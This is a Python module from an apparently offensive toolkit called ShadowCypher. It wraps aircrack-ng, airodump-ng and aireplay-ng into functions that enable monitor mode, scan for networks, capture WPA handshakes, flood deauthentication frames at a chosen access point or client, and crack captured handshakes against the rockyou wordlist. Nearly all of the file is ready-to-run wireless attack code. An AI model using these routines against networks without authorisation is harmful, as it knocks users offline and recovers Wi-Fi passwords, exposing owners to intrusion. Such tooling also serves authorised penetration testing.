"""ShadowCypher Wireless Attacks Engine — High-Fidelity Sync (V23.2)."""

import subprocess
from shadowcypher.core.logger import logger
from shadowcypher.core.runner import runner
from shadowcypher.core.sanitize import validate_interface, validate_mac, validate_filepath


class Wireless:
    """Universal wireless engine. Integrates Airmon-ng, Airodump, and Aireplay."""

    @staticmethod
    def list_interfaces_sync():
        """List wireless interfaces synchronously."""
        try:
            return subprocess.check_output(["iwconfig"], text=True, stderr=subprocess.DEVNULL)
        except Exception:
            return "No wireless interfaces detected."

    @staticmethod
    def enable_monitor(interface, on_output=None, on_complete=None):
        """Put wireless interface into monitor mode."""
        if not validate_interface(interface):
            if on_output: on_output(f"[ERROR] Invalid interface: {interface}")
            return
        runner.execute_task("ENABLE_MONITOR", ["airmon-ng", "start", interface], callback=on_output)

    @staticmethod
    def disable_monitor(interface, on_output=None, on_complete=None):
        """Take interface out of monitor mode."""
        if not validate_interface(interface):
            if on_output: on_output(f"[ERROR] Invalid interface: {interface}")
            return
        runner.execute_task("DISABLE_MONITOR", ["airmon-ng", "stop", interface], callback=on_output)

    @staticmethod
    def scan_networks(interface, duration=30, on_output=None, on_complete=None):
        """Scan for wireless networks using airodump-ng."""
        if not validate_interface(interface):
            if on_output: on_output(f"[ERROR] Invalid interface: {interface}")
            return
        runner.execute_task("WIFI_SCAN", ["timeout", str(int(duration)), "airodump-ng", interface], callback=on_output)

    @staticmethod
    def list_interfaces(on_output=None, on_complete=None):
        runner.execute_task("LIST_IFACES", ["iwconfig"], callback=on_output)

    @staticmethod
    def capture_handshake(interface, bssid, channel, timeout=120, on_output=None, on_complete=None):
        """Capture WPA handshake with optional timeout."""
        if not validate_interface(interface):
            if on_output: on_output(f"[ERROR] Invalid interface: {interface}")
            return
        if not validate_mac(bssid):
            if on_output: on_output(f"[ERROR] Invalid BSSID: {bssid}")
            return
        runner.execute_task("HANDSHAKE_CAPTURE", [
            "timeout", str(int(timeout)), "airodump-ng",
            "-c", str(int(channel)), "--bssid", bssid,
            "-w", "/tmp/handshake", interface
        ], callback=on_output)

    @staticmethod
    def deauth(interface, bssid, client=None, count=10, on_output=None, on_complete=None):
        """Send deauthentication frames."""
        if not validate_interface(interface):
            if on_output: on_output(f"[ERROR] Invalid interface: {interface}")
            return
        if not validate_mac(bssid):
            if on_output: on_output(f"[ERROR] Invalid BSSID: {bssid}")
            return
        args = ["aireplay-ng", "-0", str(int(count)), "-a", bssid]
        if client:
            if not validate_mac(client):
                if on_output: on_output(f"[ERROR] Invalid client MAC: {client}")
                return
            args += ["-c", client]
        args.append(interface)
        runner.execute_task("DEAUTH_ATTACK", args, callback=on_output)

    @staticmethod
    def crack_wpa(cap_file, wordlist=None, on_output=None, on_complete=None):
        """Crack WPA handshake using aircrack-ng."""
        if not validate_filepath(cap_file):
            if on_output: on_output(f"[ERROR] Invalid capture file path: {cap_file}")
            return
        wlist = wordlist or "/usr/share/wordlists/rockyou.txt"
        if not validate_filepath(wlist):
            if on_output: on_output(f"[ERROR] Invalid wordlist path: {wlist}")
            return
        runner.execute_task("WPA_CRACK", ["aircrack-ng", "-w", wlist, cap_file], callback=on_output)
